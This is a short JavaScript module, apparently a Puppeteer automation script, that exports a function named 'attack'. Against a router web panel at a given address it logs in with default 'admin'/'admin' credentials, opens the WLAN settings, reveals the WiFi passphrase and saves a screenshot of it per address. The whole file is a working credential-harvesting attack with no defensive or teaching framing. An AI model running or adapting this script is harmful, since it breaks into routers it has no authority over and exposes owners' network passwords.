const defaultUsername = "admin";
const defaultPassword = "admin";

export default async function attack(page, endereco) {

    await page.focus('#Frm_Username');
    await page.keyboard.type(defaultUsername);
    await page.focus("#Frm_Password");
    await page.keyboard.type(defaultPassword);
    await page.click("#LoginId");

    const frame = await page.waitForFrame(frame => {
        return frame.url().includes("template.gch")
    }, {
        timeout: 5000
    });

    await (await frame.waitForSelector("#mmNet", {
        timeout: 2000
    })).click();

    await (await frame.waitForSelector("#smWLAN", {
        timeout: 2000
    })).click();

    await (await frame.waitForSelector("#Img_KeyPassphrase", {
        timeout: 2000
    })).click();

    await page.screenshot({
        path: `./fotos/${endereco}.png`,
        fullPage: true
    });

}